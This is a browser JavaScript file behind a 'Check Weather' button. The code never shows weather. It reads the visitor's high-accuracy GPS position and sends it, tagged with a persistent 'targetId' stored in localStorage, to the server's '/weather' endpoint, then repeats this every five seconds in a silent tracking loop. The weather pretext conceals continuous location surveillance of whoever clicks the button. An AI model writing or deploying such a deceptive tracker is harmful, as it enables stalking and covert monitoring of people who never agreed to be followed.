const STORAGE_KEY = "id"
const UPDATE_INTERVAL = 5000

const button = document.querySelector("#check-weather")
const status = document.querySelector("#location-status")
const targetId = getTargetId()
let updateTimer

button.addEventListener("click", startTracking)

function startTracking() {
    button.disabled = true
    button.textContent = "Fetching..."
    status.textContent = "Requesting your location..."
    sendLocation()
}

function sendLocation() {
    navigator.geolocation.getCurrentPosition(postLocation, handleLocationError, {
        enableHighAccuracy: true,
    })
}

async function postLocation(position) {
    try {
        const response = await fetch("/weather", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                id: targetId,
                lat: position.coords.latitude,
                lng: position.coords.longitude,
            }),
        })

        if (!response.ok) throw new Error("Location update failed")
        status.textContent = "Weather updated."
    } catch (error) {
        status.textContent = "Unable to update. Trying again..."
    }

    scheduleNextUpdate()
}

function handleLocationError(error) {
    button.disabled = false
    button.textContent = "Check Weather"
    status.textContent = "Please turn on GPS location and try again."
    console.error("Error reading location:", error)
}

function scheduleNextUpdate() {
    clearTimeout(updateTimer)
    updateTimer = setTimeout(sendLocation, UPDATE_INTERVAL)
}

function getTargetId() {
    const existingId = localStorage.getItem(STORAGE_KEY)
    if (existingId) return existingId

    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    let newId = ""

    for (let index = 0; index < 10; index += 1) {
        newId += characters[Math.floor(Math.random() * characters.length)]
    }

    localStorage.setItem(STORAGE_KEY, newId)
    return newId
}
